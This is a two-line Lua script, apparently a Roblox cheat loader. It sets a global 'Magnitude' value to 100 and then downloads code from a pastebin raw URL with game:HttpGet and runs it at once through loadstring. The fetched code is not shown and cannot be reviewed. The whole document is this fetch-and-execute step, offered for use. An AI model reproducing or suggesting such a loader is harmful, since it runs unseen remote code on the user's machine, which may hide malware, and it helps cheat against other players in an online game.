_G.Magnitude = 100
loadstring(game:HttpGet("https://pastebin.com/raw/czJWKBYM"))()